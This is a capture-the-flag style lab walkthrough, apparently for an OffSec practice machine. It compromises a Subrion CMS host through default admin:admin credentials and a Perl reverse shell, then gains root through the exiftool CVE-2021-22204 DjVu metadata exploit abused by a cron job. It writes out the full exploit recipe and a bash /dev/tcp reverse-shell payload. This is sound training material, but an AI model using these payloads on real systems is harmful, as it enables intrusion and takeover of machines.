`└─$ autonmap -H 192.168.190.163 -t all`  

`Running all scans on 192.168.190.163`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

Check what's running on port 80

![[Pasted image 20240208001443.png]]

Add exfiltrated.offsec to /etc/hosts

![[Pasted image 20240208001517.png]]

Turns out there is a weak password, we can sign in with admin:admin

![[Pasted image 20240208001549.png]]

In the top left corner we see it's Subrion CMS
![[Pasted image 20240208001700.png]]


![[Pasted image 20240208001739.png]]

![[Pasted image 20240208001930.png]]

Try a few different ways to upgrade the shell

`$ python -V`

`$ perl -v`

`This is perl 5, version 30, subversion 0 (v5.30.0) built for x86_64-linux-gnu-thread-multi`
`(with 50 registered patches, see perl -V for more detail)`

`Copyright 1987-2019, Larry Wall`

`Perl may be copied only under the terms of either the Artistic License or the`
`GNU General Public License, which may be found in the Perl 5 source kit.`

`Complete documentation for Perl, including FAQ lists, should be found on`
`this system using "man perl" or "perldoc perl".  If you have access to the`
`Internet, point your browser at http://www.perl.org/, the Perl Home Page.`

`$ cd /tmp`

Looks like perl is the answer

Downloaded the perl reverse shell from here: https://pentestmonkey.net/tools/web-shells/perl-reverse-shell

Change the IP in it, uploaded and executed

![[Pasted image 20240208003117.png]]

`└─$ nc -nlvp 1234`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:1234`
`Ncat: Listening on 0.0.0.0:1234`
`Ncat: Connection from 192.168.190.163:60484.`
 `05:28:39 up 47 min,  0 users,  load average: 0.00, 0.00, 0.00`
`USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT`
`Linux exfiltrated 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
`/`

Was able to upgrade it with `$ python -c 'import pty; pty.spawn("/bin/bash")'

`/usr/sbin/apache: 0: can't access tty; job control turned off`
`$ python -c 'import pty; pty.spawn("/bin/bash")'`
`/usr/sbin/apache: 1: python: not found`
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@exfiltrated:/$` 

After sorting through all the unnecessary trash from linpeas, we find the crontab output
![[Pasted image 20240208004312.png]]

It scans the uploads folder for any new images and runs the image through exiftool to get the metadata.

![[Pasted image 20240208004448.png]]

![[Pasted image 20240208004507.png]]

![[Pasted image 20240208004546.png]]

To make the poisoned image file you need exiftool version 12.23 and no later

We can get this from https://github.com/exiftool/exiftool

Pick releases on the right hand side of the github page
![[Pasted image 20240208102007.png]]

Click the compare drop down and pick the version before the one you want so 12.22

![[Pasted image 20240208102052.png]]

![[Pasted image 20240208102146.png]]

Click the button to copy the SHA for the 12.23 commit

![[Pasted image 20240208102249.png]]
How to compile and install from the readme 

![[Pasted image 20240208102451.png]]
* to execute the last command you need to use sudo

![[Pasted image 20240208102610.png]]

https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
This page is a guide how to make the file

`sudo apt install djvulibre-bin

Make a payload file like the guide shows but with a reverse shell instead

`└─$ cat payload`  
`(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.235/443 0>&1\"')};")`

Compress it
`bzz payload payload.bzz`

Make the djvu file
`djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

Make the config file
`└─$ cat configfile`
`%Image::ExifTool::UserDefined = (`
    `# All EXIF tags are added to the Main table, and WriteGroup is used to`
    `# specify where the tag is written (default is ExifIFD if not specified):`
    `'Image::ExifTool::Exif::Main' => {`
        `# Example 1.  EXIF:NewEXIFTag`
        `0xc51b => {`
            `Name => 'HasselbladExif',`
            `Writable => 'string',`
            `WriteGroup => 'IFD0',`
        `},`
        `# add more user-defined EXIF tags here...`
    `},`
`);`
`1; #end%`

run the exiftool to inject the malicious metadata

`└─$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' sample.jpg`
    `1 image files updated`

Copy the bad image to the uploads folder from the crontab script
`www-data@exfiltrated:/$ cd /var/www/html/subrion/uploads`
`cd /var/www/html/subrion/uploads`
`www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.45.235/sample.jpg`

Setup the listener and wait for it to run

`└─$ nc -nlvp 443` 
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:443`
`Ncat: Listening on 0.0.0.0:443`

After maybe a minute - root obtained

`Ncat: Connection from 192.168.190.163:33210.`
`bash: cannot set terminal process group (51352): Inappropriate ioctl for device`
`bash: no job control in this shell`
`root@exfiltrated:~#` 


